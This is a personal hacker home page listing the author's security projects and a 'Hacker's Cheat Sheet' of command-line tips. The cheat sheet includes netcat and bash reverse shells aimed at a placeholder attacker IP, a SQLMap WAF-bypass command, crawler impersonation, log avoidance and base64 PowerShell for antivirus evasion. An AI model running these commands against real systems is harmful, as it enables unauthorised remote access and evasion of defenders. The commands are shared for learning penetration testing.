---
layout: default
title: Home
---

# 🖥️ Welcome to WebPro's Hacker Space 🖥️

![Hacker Banner](https://user-images.githubusercontent.com/hacker-image.png)

Welcome to the dark side of the internet, where we explore cybersecurity, vulnerabilities, and cutting-edge technology.

---

## 🚀 Latest Projects 🚀

Here are some of the cool projects I’ve been working on:

- 🛠️ [HiddenSecTools](https://github.com/webpro255/HiddenSecTools) - A repository of hidden security tools.
- 🔍 [EventViewer-LogHunting](https://github.com/webpro255/EventViewer-LogHunting) - Hunt for security-relevant logs with Windows Event Viewer.
- 🛡️ [WordPress Forensics](https://github.com/webpro255/wordpress-forensics-tool) - Forensics tools specifically for WordPress investigations.
- 📊 [ELK-SOC-Tips](https://github.com/webpro255/ELK-SOC-Tips) - Tips and techniques for setting up an ELK stack in a SOC environment.
- 📡 [Network Traffic Visualization](https://github.com/webpro255/network-traffic-visualization) - Visualize network traffic in a clear and concise way.
- 🔧 [IT Support Scripts](https://github.com/webpro255/it-support-scripts) - A collection of useful scripts for IT support.
- 🔐 [IAM Policy Simulator](https://github.com/webpro255/iam-policy-simulator) - A project to simulate IAM policies for cloud security.
- 🔍 [Network Scanning Tools](https://github.com/webpro255/network-scanning-tools) - A collection of tools for network scanning and reconnaissance.
- 📈 [Network Anomaly Detection](https://github.com/webpro255/network-anomaly-detection) - Detect network anomalies using these tools and techniques.
---

## 👨‍💻 About Me 👨‍💻

I am WebPro, passionate about cybersecurity, ethical hacking, and building tools to create a more secure future. I love experimenting with new technologies, finding vulnerabilities, and sharing my knowledge with the community.

---
## 🕵️ Cybersecurity Challenge 🕵️

Want to test your skills? Try to crack the password in our **[Password Cracker Game](./cyber-game.html)** and see how quickly you can break in!

## 🎮 Play another Game 🎮

Feeling like taking a break? Try your hand at the **[Guess the Number Game](./game.html)** and see if you can guess the correct number!

---
## 🧠 Hacker's Cheat Sheet 🧠

Only true hackers will appreciate these gems—cutting-edge tips and tricks that can elevate your penetration testing and ethical hacking skills. 

### 🔥 1. Command Line Kung Fu

- **List all open ports** (with process info) on Linux:
  ```bash
  sudo netstat -tuln -p
  ```
> Quickly see what's open on your system without needing fancy tools.

- Find all hidden files on a Linux machine:
  ```
  find / -name ".*" -type f
  ```
> Great for uncovering hidden configurations or malicious scripts.

- Fast directory scanning with FFUF:
  ```
  ffuf -w /path/to/wordlist.txt -u https://example.com/FUZZ -e .php,.html,.txt -o output.txt
  ```
> Quick and powerful fuzzing to discover hidden directories.

### 🚀 2. Hidden Gems in Wireshark

- Capture only HTTP GET requests:

```
http.request.method == "GET"
```
> Skip the noise and capture just the GET requests to hunt for interesting activity.

- Filter for suspicious DNS activity:
  ```
  dns.qry.name == "evil.com"
  ```
> Target specific DNS queries to detect if someone's reaching out to malicious domains.

### 🔒 3. Bypass Techniques
- Bypass WAF using SQLMap with tamper scripts:
```
sqlmap -u "http://example.com/vuln.php?id=1" --tamper=space2comment --level=5 --risk=3
```
> Get around pesky WAFs with a tamper script and crank up the aggression.

- Custom User-Agent to fool detection systems:
```
curl -A "Googlebot/2.1 (+http://www.google.com/bot.html)" http://target.com
```

> Impersonate a search engine crawler to bypass access restrictions.

### 🛡️ 4. Advanced Reverse Shells

- Obfuscated Netcat reverse shell:

```
mkfifo /tmp/lolpipe; nc <attacker IP> <port> 0</tmp/lolpipe | /bin/sh >/tmp/lolpipe 2>&1; rm /tmp/lolpipe
```
> Use named pipes to create stealthier reverse shells, harder to detect by basic monitoring.

- Bash TCP reverse shell (for when Netcat isn’t available):
```
bash -i >& /dev/tcp/<attacker IP>/<port> 0>&1
```
> Minimal footprint, effective on many Unix-based systems.
### 💻 5. Stealth Techniques
- Avoid logging by executing commands in memory (Linux):
```
exec /bin/bash 0</dev/null 2>/dev/null
```
> Run commands in a way that avoids leaving traces in `/var/log` files.

- Evade AV detection with PowerShell base64 encoding:
  ```
  powershell.exe -EncodedCommand <Base64 Encoded Command>
  ```
> Hide your PowerShell commands by encoding them in Base64, bypassing some AV detection.
### 🛠️ 6. Tools You Might Not Know (But Should)
- ([Obsidian]https://obsidian.md/)– A tool for creating encrypted vaults of notes and penetration testing playbooks
- ([Chaos Reader]http://chaosreader.sourceforge.net/) – Parse, analyze, and extract files from packet capture (.pcap) files.
- ([LinEnum]https://github.com/rebootuser/LinEnum)– A Linux enumeration script to quickly find privilege escalation vectors.
### 🎯 7. Fuzzing on Steroids
- Fuzzing APIs with POST requests using FFUF:
  ```
  ffuf -w wordlist.txt -X POST -d "parameter1=value&FUZZ=value" -u https://target.com/api/endpoint -o output.json
  ```
> Quickly find API vulnerabilities by fuzzing POST request bodies.

- Fuzzing JSON APIs with AFL (American Fuzzy Lop):
  ```
  afl-fuzz -i input/ -o output/ -- ./target_binary @@
  ```
> Use AFL to find memory corruption issues in JSON parsers, or other binary targets.
💡 **Bonus Tip**: Always remember to document your findings in detail. Hacking without reporting is just half the work. 😉
  

## 🤝 Connect with Me 🤝

Follow me on [GitHub](https://github.com/webpro255) for the latest updates, tools, and resources!

